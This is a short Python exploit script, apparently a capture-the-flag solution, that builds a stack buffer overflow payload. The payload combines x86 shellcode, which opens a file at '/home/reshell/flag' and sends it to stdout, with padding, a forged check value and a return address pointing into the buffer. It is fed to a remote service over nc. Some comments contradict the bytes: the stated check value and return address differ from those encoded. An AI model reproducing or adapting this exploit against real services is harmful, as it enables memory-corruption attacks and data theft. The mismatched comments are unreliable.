import sys
payload = b''
payload += b"\x68\x01\x01\x01\x01\x81\x34\x24\x75\x79\x75\x01\x68\x6c\x61\x67\x2e\x68\x6c\x6c\x2f\x66\x68\x74\x73\x68\x65\x68\x65\x2f\x72\x65\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80\x31\xdb\x6a\x01\x58\xcd\x80"
# Add shellcode(65 bytes).
payload += b'A' * (520 - len(payload) - 4) # Fill with any value.
payload += b'\xef\xcd\x76\x98' # Convert check element as 0x9876cdaf in little endian manner.
payload += b'\x0c\xf4\xff\xbf' # Fill old ebp area as any value.
# $esp = 0xbffff834
payload += b'\x34\xf8\xff\xbf' # Change ret addr as 0xbffff414 which is start addr of buf in little endian manner.
# $ebp = 0xbffff40c

sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer
# bffff834